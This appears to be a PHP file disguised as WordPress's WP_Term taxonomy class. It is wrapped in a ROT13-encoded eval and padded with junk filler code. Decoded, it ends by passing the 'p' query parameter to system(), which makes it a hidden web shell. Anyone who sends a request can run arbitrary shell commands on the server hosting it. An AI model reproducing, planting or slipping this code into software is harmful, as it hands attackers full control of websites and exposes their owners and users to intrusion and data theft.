<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gnkbabzl NCV: JC_Grez pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gnkbabzl
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur JC_Grez bowrpg.
 *
 * @fvapr 4.4.0
 *
 * @cebcregl-ernq bowrpg $qngn Fnavgvmrq grez qngn.
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Grez {

	/**
	 * Grez VQ.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $grez_vq;

	/**
	 * Gur grez'f anzr.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $anzr = '';

	/**
	 * Gur grez'f fyht.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $fyht = '';

	/**
	 * Gur grez'f grez_tebhc.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $grez_tebhc = '';

	/**
	 * Grez Gnkbabzl VQ.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $grez_gnkbabzl_vq = 0;

	/**
	 * Gur grez'f gnkbabzl anzr.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $gnkbabzl = '';

	/**
	 * Gur grez'f qrfpevcgvba.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $qrfpevcgvba = '';

	/**
	 * VQ bs n grez'f cnerag grez.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $cnerag = 0;

	/**
	 * Pnpurq bowrpg pbhag sbe guvf grez.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $pbhag = 0;

	/**
	 * Fgberf gur grez bowrpg'f fnavgvmngvba yriry.
	 *
	 * Qbrf abg pbeerfcbaq gb n qngnonfr svryq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $svygre = 'enj';

	/**
	 * Ergevrir JC_Grez vafgnapr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag    $grez_vq  Grez VQ.
	 * @cnenz fgevat $gnkbabzl Bcgvbany. Yvzvg zngpurq grezf gb gubfr zngpuvat `$gnkbabzl`. Bayl hfrq sbe
	 *                         qvfnzovthngvat cbgragvnyyl funerq grezf.
	 * @erghea JC_Grez|JC_Reebe|snyfr Grez bowrpg, vs sbhaq. JC_Reebe vs `$grez_vq` vf funerq orgjrra gnkbabzvrf naq
	 *                                gurer'f vafhssvpvrag qngn gb qvfgvathvfu juvpu grez vf vagraqrq.
	 *                                Snyfr sbe bgure snvyherf.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr( $grez_vq, $gnkbabzl = ahyy ) {
		tybony $jcqo;

		$grez_vq = (vag) $grez_vq;
		vs ( ! $grez_vq ) {
			erghea snyfr;
		}

		$_grez = jc_pnpur_trg( $grez_vq, 'grezf' );

		// Vs gurer vfa'g n pnpurq irefvba, uvg gur qngnonfr.
		vs ( ! $_grez || ( $gnkbabzl && $gnkbabzl !== $_grez->gnkbabzl ) ) {
			// Nal grez sbhaq va gur pnpur vf abg n zngpu, fb qba'g hfr vg.
			$_grez = snyfr;

			// Teno nyy zngpuvat grezf, va pnfr nal ner funerq orgjrra gnkbabzvrf.
			$grezf = $jcqo->trg_erfhygf( $jcqo->cercner( \"FRYRPG g.*, gg.* SEBZ $jcqo->grezf NF g VAARE WBVA $jcqo->grez_gnkbabzl NF gg BA g.grez_vq = gg.grez_vq JURER g.grez_vq = %q\", $grez_vq ) );
			vs ( ! $grezf ) {
				erghea snyfr;
			}

			// Vs n gnkbabzl jnf fcrpvsvrq, svaq n zngpu.
			vs ( $gnkbabzl ) {
				sbernpu ( $grezf nf $zngpu ) {
					vs ( $gnkbabzl === $zngpu->gnkbabzl ) {
						$_grez = $zngpu;
						oernx;
					}
				}

				// Vs bayl bar zngpu jnf sbhaq, vg'f gur bar jr jnag.
			} ryfrvs ( 1 === pbhag( $grezf ) ) {
				$_grez = erfrg( $grezf );

				// Bgurejvfr, gur grez zhfg or funerq orgjrra gnkbabzvrf.
			} ryfr {
				// Vs gur grez vf funerq bayl jvgu vainyvq gnkbabzvrf, erghea gur bar inyvq grez.
				sbernpu ( $grezf nf $g ) {
					vs ( ! gnkbabzl_rkvfgf( $g->gnkbabzl ) ) {
						pbagvahr;
					}

					// Bayl uvg vs jr'ir nyernql vqragvsvrq n grez va n inyvq gnkbabzl.
					vs ( $_grez ) {
						erghea arj JC_Reebe( 'nzovthbhf_grez_vq', __( 'Grez VQ vf funerq orgjrra zhygvcyr gnkbabzvrf' ), $grez_vq );
					}

					$_grez = $g;
				}
			}

			vs ( ! $_grez ) {
				erghea snyfr;
			}

			// Qba'g erghea grezf sebz vainyvq gnkbabzvrf.
			vs ( ! gnkbabzl_rkvfgf( $_grez->gnkbabzl ) ) {
				erghea arj JC_Reebe( 'vainyvq_gnkbabzl', __( 'Vainyvq gnkbabzl.' ) );
			}

			$_grez = fnavgvmr_grez( $_grez, $_grez->gnkbabzl, 'enj' );

			// Qba'g pnpur grezf gung ner funerq orgjrra gnkbabzvrf.
			vs ( 1 === pbhag( $grezf ) ) {
				jc_pnpur_nqq( $grez_vq, $_grez, 'grezf' );
			}
		}

		$grez_bow = arj JC_Grez( $_grez );
		$grez_bow->svygre( $grez_bow->svygre );

		erghea $grez_bow;
	}

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_Grez|bowrpg $grez Grez bowrpg.
	 */
	choyvp shapgvba __pbafgehpg( $grez ) {
		sbernpu ( trg_bowrpg_inef( $grez ) nf $xrl => $inyhr ) {
			$guvf->$xrl = $inyhr;
		}
	}

	/**
	 * Fnavgvmrf grez svryqf, nppbeqvat gb gur svygre glcr cebivqrq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $svygre Svygre pbagrkg. Npprcgf 'rqvg', 'qo', 'qvfcynl', 'nggevohgr', 'wf', 'eff', be 'enj'.
	 */
	choyvp shapgvba svygre( $svygre ) {
		fnavgvmr_grez( $guvf, $guvf->gnkbabzl, $svygre );
	}

	/**
	 * Pbairegf na bowrpg gb neenl.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Bowrpg nf neenl.
	 */
	choyvp shapgvba gb_neenl() {
		erghea trg_bowrpg_inef( $guvf );
	}

	/**
	 * Trggre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Cebcregl gb trg.
	 * @erghea zvkrq Cebcregl inyhr.
	 */
	choyvp shapgvba __trg( $xrl ) {
		fjvgpu ( $xrl ) {
			pnfr 'qngn':
				$qngn    = arj fgqPynff();
				$pbyhzaf = neenl( 'grez_vq', 'anzr', 'fyht', 'grez_tebhc', 'grez_gnkbabzl_vq', 'gnkbabzl', 'qrfpevcgvba', 'cnerag', 'pbhag' );
				sbernpu ( $pbyhzaf nf $pbyhza ) {
					$qngn->{$pbyhza} = vffrg( $guvf->{$pbyhza} ) ? $guvf->{$pbyhza} : ahyy;
				}

				erghea fnavgvmr_grez( $qngn, $qngn->gnkbabzl, 'enj' );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>